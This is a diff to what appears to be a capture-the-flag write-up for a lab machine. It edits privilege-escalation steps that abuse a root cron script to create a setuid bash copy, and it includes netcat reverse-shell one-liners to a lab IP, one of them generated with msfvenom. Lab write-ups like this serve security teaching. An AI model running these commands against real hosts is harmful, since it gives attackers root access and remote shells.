@@ -781,14 +781,14 @@ The content of file `/etc/print.sh`:
 
 ```commandline
 #!/bin/bash
-cp /bin/bash /tmp/bash
-chmod 4755 /tmp/bash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
 ```
 
 Once the cron job is executed:
 
 ```commandline
-lennie@startup:~/scripts$ /tmp/bash -p
+lennie@startup:~/scripts$ /tmp/rootbash -p
 bash-4.3# id
 uid=1002(lennie) gid=1002(lennie) euid=0(root) groups=1002(lennie)
 bash-4.3# 
@@ -822,9 +822,21 @@ The content of file `/etc/print.sh`:
 
 ```commandline
 #!/bin/bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.208.30 4321 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.8.208.30 4321 > /tmp/f
 echo "Done!"
 ```
+
+**Tip**: Check out also `msfvenom` to create such kinds of payloads:
+
+````commandline
+$ msfvenom -p cmd/unix/reverse_netcat lhost=10.8.208.30 lport=8888 revshell
+
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 89 bytes
+mkfifo /tmp/kdje; nc 10.8.208.30 8888 0</tmp/kdje | /bin/sh >/tmp/kdje 2>&1; rm /tmp/kdje
+````
 
 ## Mission accomplished
 
